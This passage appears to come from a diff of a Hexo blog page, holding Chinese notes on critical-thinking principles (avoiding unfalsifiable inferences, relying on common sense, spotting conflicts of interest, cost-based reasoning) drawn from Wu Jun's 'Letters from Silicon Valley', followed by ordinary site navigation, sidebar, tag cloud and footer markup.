+把错误的原因当成真正的原因，要倒大霉。一定要小心无法证伪的推论，一个事情成功的因素可以有很多，都可以解释的通。
+常识之所以重要是因为经过了长时间的证实和证伪是可靠的结论，遵循常识就可以避开很多的错误和陷阱
+
+
+判定利益冲突
+
+当发表意见的人和所讨论的主题利益相关，那么其结可能就会有明显的偏向性。
+使用逻辑过滤信息和结论
+得出问题结论的推理过程需要符合逻辑，不能依靠想象。
+
+
+利用成本思维进行判断
+
+做任何事情都有成本，当接受的信息太多的时候，可以用成本因素进行过滤，通过成本来思考人们做事的初衷和理由是有效的。
+
+
+
+#硅谷来信 #吴军
+</div></div></div><nav id="pagination"><div class="pagination"><a class="extend prev" rel="prev" href="/page/5/#content-inner"><i class="fas fa-chevron-left fa-fw"></i></a><a class="page-number" href="/">1</a><span class="space">&hellip;</span><a class="page-number" href="/page/5/#content-inner">5</a><span class="page-number current">6</span><a class="page-number" href="/page/7/#content-inner">7</a><span class="space">&hellip;</span><a class="page-number" href="/page/11/#content-inner">11</a><a class="extend next" rel="next" href="/page/7/#content-inner"><i class="fas fa-chevron-right fa-fw"></i></a></div></nav></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="is-center"><div class="avatar-img"><img src="/img/avatar.png" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info__name">henices</div><div class="author-info__description"></div></div><div class="card-info-data site-data is-center"><a href="/archives/"><div class="headline">Articles</div><div class="length-num">102</div></a><a href="/tags/"><div class="headline">Tags</div><div class="length-num">15</div></a></div></div><!--    a(href=url_for(config.category_dir) + '/')--><!--      .headline= _p('aside.categories') --><!--      .length-num= site.categories.lengthif theme.aside.card_author.button.enable
+  a#card-info-btn(href=theme.aside.card_author.button.link)
+    i(class=theme.aside.card_author.button.icon)
+    span=theme.aside.card_author.button.text
+
+if(theme.social)
+    .card-info-social-icons.is-center
+      !=partial('includes/header/social', {}, {cache: true})--><div class="sticky_layout"><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>Recent Post</span></div><div class="aside-list"><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/cn/pdfium-fuzz.public/" title="使用 afl-fuzz fuzz pdfium">使用 afl-fuzz fuzz pdfium</a><time datetime="2023-11-06T05:52:04.969Z" title="Created 2023-11-06 13:52:04">2023-11-06</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/en/learn_in_public/" title="Learn In Public 摘要">Learn In Public 摘要</a><time datetime="2023-11-01T15:05:19.059Z" title="Created 2023-11-01 23:05:19">2023-11-01</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/cn/tulading/" title="图拉鼎谈独立开发">图拉鼎谈独立开发</a><time datetime="2023-10-31T16:00:00.000Z" title="Created 2023-11-01 00:00:00">2023-11-01</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/cn/youyuxi/" title="尤雨溪谈成功和运气">尤雨溪谈成功和运气</a><time datetime="2023-10-31T16:00:00.000Z" title="Created 2023-11-01 00:00:00">2023-11-01</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/cn/qiangliyandu/" title="万维钢的强力研读笔记法">万维钢的强力研读笔记法</a><time datetime="2023-09-24T16:00:00.000Z" title="Created 2023-09-25 00:00:00">2023-09-25</time></div></div></div></div><div class="card-widget card-tags"><div class="item-headline"><i class="fas fa-tags"></i><span>Tags</span></div><div class="card-tag-cloud"><a href="/tags/Malware/" style="font-size: 1.32em; color: #99a2ae">Malware</a> <a href="/tags/Software/" style="font-size: 1.25em; color: #999fa7">Software</a> <a href="/tags/PKM/" style="font-size: 1.21em; color: #999da3">PKM</a> <a href="/tags/Archives/" style="font-size: 1.14em; color: #999a9c">Archives</a> <a href="/tags/investment/" style="font-size: 1.39em; color: #99a5b5">investment</a> <a href="/tags/KNOWLEDGE/" style="font-size: 1.1em; color: #999">KNOWLEDGE</a> <a href="/tags/vim/" style="font-size: 1.25em; color: #999fa7">vim</a> <a href="/tags/Security/" style="font-size: 1.5em; color: #99a9bf">Security</a> <a href="/tags/Android/" style="font-size: 1.46em; color: #99a8bc">Android</a> <a href="/tags/Crack/" style="font-size: 1.17em; color: #999ca0">Crack</a> <a href="/tags/windows/" style="font-size: 1.32em; color: #99a2ae">windows</a> <a href="/tags/ai/" style="font-size: 1.1em; color: #999">ai</a> <a href="/tags/linux/" style="font-size: 1.43em; color: #99a6b8">linux</a> <a href="/tags/Life/" style="font-size: 1.28em; color: #99a0aa">Life</a> <a href="/tags/Programming/" style="font-size: 1.35em; color: #99a3b1">Programming</a></div></div></div></div></main><footer id="footer"><div id="footer-wrap"><div class="copyright">&copy;2020 - 2023 By henices</div><div class="framework-info"><span>Framework </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>Theme </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="darkmode" type="button" title="Toggle Between Light And Dark Mode"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="Toggle between Single-column and Double-column"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside-config" type="button" title="Setting"><i class="fas fa-cog fa-spin"></i></button><button id="go-up" type="button" title="Back To Top"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox/fancybox.umd.min.js"></script><div class="js-pjax"></div><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div></body></html>
